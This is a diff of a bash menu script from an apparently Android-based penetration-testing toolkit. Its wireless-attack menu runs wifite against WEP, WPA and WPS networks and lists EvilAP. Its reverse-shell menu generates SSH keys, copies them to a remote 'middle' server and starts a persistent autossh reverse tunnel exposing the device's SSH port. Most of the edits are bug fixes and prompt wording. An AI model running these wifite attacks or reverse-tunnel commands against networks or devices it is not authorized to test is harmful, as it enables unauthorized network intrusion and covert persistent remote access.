@@ -51,7 +51,7 @@ echo "[2]	EvilAP"
 echo "[3]	Kismet"
 echo ""
 echo "[0]	Exit"
-
+echo ""
 read -p "Choice: " wirelesschoice
 
 case $wirelesschoice in
@@ -98,10 +98,10 @@ echo "[0] Exit to Wirelss Attack Menu"
 echo -n "Enter your menu choice [1-3]: "
 read yourch
 case $yourch in
-1) wifite mac -i wlan1 ;;
-2) wifite -all -wep mac ;;
-3) wifite -all -wpa --dict none mac ;;
-4) wifite -p 40 -wps ;;
+1) clear; wifite ;;
+2) clear; wifite -all -wep ;;
+3) clear; wifite -all -wpa --dict none ;;
+4) clear; wifite -p 40 -wps ;;
 0) clear; f_wireless_attacks ;;
 *) echo "Incorrect choice..." ;
 echo "Press Enter to continue. . ." ; read ;; esac
@@ -381,13 +381,13 @@ f_exploitation(){
 	echo "Insert"
 }
 ########################## REVERSE MENU ################################
-
 f_reverse(){
 echo "				REVERSE SHELLS"
 echo ""
 echo "[1] Setup AutoSSH (if you can ssh out)"
 echo "[2] Setup pTunnel - (if you can ping out)"
-echo "[#] "
+echo "+++++++++++++++++ EXECUTE +++++++++++++++++ "
+echo ""
 echo "[3] Start AutoSSH reverse shell"
 echo "[0] Exit to main menu"
 echo ""
@@ -407,9 +407,10 @@ clear
 if [ -e "/root/.ssh/auto_id_rsa" ]; then
         echo "SSH keys found at /root/.ssh/auto_id_rsa"
         read -p "Would you like to generate new SSH keys? (y/n):" autossh_new_keys
-        if [ "$autossh_new_keys" == "y"]
+        if [ "$autossh_new_keys" == "y" ]; then
         	rm -rf /root/.ssh/auto_id*
         	f_generate_autossh_keys
+        fi
 else
 	echo "KEY AUTO_ID_RSA NOT FOUND: Generate new SSH keys?"
 	f_generate_autossh_keys
@@ -425,7 +426,7 @@ fi
 		sleep 4
 	}
 
-read -p "Copy keys to remote (middle) server? (y/n)" copykeymiddle
+read -p "Copy keys to remote (middle) server? (y/n): " copykeymiddle
 if [ "$copykeymiddle" == "y" ]; then
 		echo "Enter remote host connection details:"
 		echo ""
@@ -434,6 +435,7 @@ if [ "$copykeymiddle" == "y" ]; then
 		read -p "Enter remote server port: " -e -i "22" amp
 		ssh-copy-id -i /root/.ssh/auto_id_rsa.pub "-p $amp $amu@$amh"
 fi
+f_reverse
 }
 
 f_start_autossh(){
@@ -441,6 +443,7 @@ f_start_autossh(){
 # For help setting up autossh, I utilized the guide here:
 # https://raymii.org/s/tutorials/Autossh_persistent_tunnels.html
 #
+clear
 if [ -e "/root/autossh_config" ]; then
 	read -p "Use previous autossh configuration? (y/n): " autossh_previous
 		if [ "$autossh_previous" == "y" ]; then
@@ -449,7 +452,7 @@ if [ -e "/root/autossh_config" ]; then
 			f_reverse
 		fi
 	else
-	read -p "Would you like to remove configuration? (y/n): " autossh_remove
+	read -p "Would you like to remove previous configuration? (y/n): " autossh_remove
 		if [ "autossh_remove" == "y" ]; then
 			rm -rf /root/autossh_config
 		fi
@@ -464,9 +467,11 @@ echo ""
 echo "Starting autossh..."
 autossh -M $autossh_local_port -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /root/.ssh/auto_id_rsa -R $autossh_forward_port:localhost:22 $amu@$amh -p $amp
 echo "You can now access this Android device from the remote server using:"
-echo "ssh -p $autossh_forward_port"
+echo "ssh -p $autossh_forward_port $amu@127.0.0.1"
 sleep 8
 clear
+echo "*** The following file will not be secure and will contain server/username information ***"
+echo ""
 read -p "Would you like to save configuration as an executable file? (y/n): " autossh_file
 	if [ "$autossh_file" == "y"]; then
 		echo "autossh -M $autossh_local_port -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /root/.ssh/auto_id_rsa -R $autossh_forward_port:localhost:22 $amu@$amh -p $amp" > /root/autossh_config
@@ -474,6 +479,7 @@ read -p "Would you like to save configuration as an executable file? (y/n): " au
 		echo "File saved to /root/autossh_config"
 		sleep 5
 	fi
+f_reverse
 }
 
 f_ptunnel(){
